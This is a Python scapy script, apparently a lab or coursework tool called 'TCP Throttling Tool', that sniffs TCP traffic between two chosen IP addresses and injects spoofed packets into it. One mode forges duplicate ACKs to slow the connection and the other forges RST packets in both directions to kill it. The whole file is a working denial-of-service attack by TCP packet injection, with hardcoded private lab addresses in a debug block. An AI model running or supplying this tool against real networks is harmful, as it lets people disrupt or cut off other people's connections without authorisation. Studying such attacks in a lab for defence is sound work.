import time

from scapy.all import *
from scapy.layers.inet import TCP, IP

class TCPThrottlingTool:

    def __init__(self, source_ip, destination_ip, mode):
        self.source = source_ip
        self.destination = destination_ip
        self.mode = mode
        self.one_time = True

    def run_tool(self):
        # Set up a filter to capture only TCP packets between the source and destination IP addresses
        filter_str = f"tcp and host {self.source} and host {self.destination}"
        print(self.source, self.destination)
        # logging.getLogger("scapy").setLevel(logging.CRITICAL)
        x = sniff(filter=filter_str, prn=lambda y: self.handle_packet(y))
        # Print the communication after end program
        print(x.summary())

    # Function to handle each captured packet
    def handle_packet(self, pkt):
        # Check for TCP packets, we only handle TCP packets
        if TCP not in pkt:
            return

        if self.mode == 1:
            if self.one_time and (pkt[IP].src == self.source and pkt[IP].dst == self.destination or pkt[IP].src == self.destination and pkt[IP].dst == self.source):
                # Send a 3 ACK packet to the origin and/or destination to slow down the connection
                if pkt[IP].src == self.source:
                    send(IP(src=self.source, dst=pkt[IP].dst) / TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", ack=pkt[TCP].seq + 1))
                    send(IP(src=self.source, dst=pkt[IP].dst) / TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", ack=pkt[TCP].seq + 2))
                    send(IP(src=self.source, dst=pkt[IP].dst) / TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", ack=pkt[TCP].seq + 3))

                    return
                elif pkt[IP].dst == self.source:
                    send(IP(src=pkt[IP].src, dst=self.source) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", ack=pkt[TCP].seq + 1))
                    send(IP(src=pkt[IP].src, dst=self.source) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", ack=pkt[TCP].seq + 2))
                    send(IP(src=pkt[IP].src, dst=self.source) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", ack=pkt[TCP].seq + 3))

                    return
            else:
                return

        if self.mode == 2:
            if self.one_time and (pkt[IP].src == self.source and pkt[IP].dst == self.destination or pkt[IP].src == self.destination and pkt[IP].dst == self.source):
                send(IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].seq+1, window=pkt[TCP].window))
                send(IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R",seq=pkt[TCP].seq+1, window=pkt[TCP].window))
                self.one_time = False
                return

        if self.mode > 2:
            print("Mode not implemented yet")
            return



def startTool(source, destination, mode):
    debug_bool = True

    if debug_bool is True:
        rasp = "192.168.50.23"
        mac = "192.168.50.188"
        vm = "192.168.50.190"
        simon = "192.168.50.180"
        source = rasp
        destination = vm

    print(f"Looking for TCP packets from {source} as source, to {destination} as destination")
    number = [5, 4, 3, 2, 1]
    for i in range(5):
        print(f"Program starts in {number[i]}")
        time.sleep(1)

    tool = TCPThrottlingTool(source_ip=source, destination_ip=destination, mode=mode)
    tool.run_tool()


if __name__ == '__main__':
    print("Hello and welcome - TCP Throttling Tool TTT.")
    source = input("Please enter source IP address.\n")
    print()
    destination = input("Please enter destination IP address.\n")
    print()
    mode = int(input("Please enter mode 1: Retransmission 2: Reset packet.\n"))

    startTool(source=source, destination=destination, mode=mode)
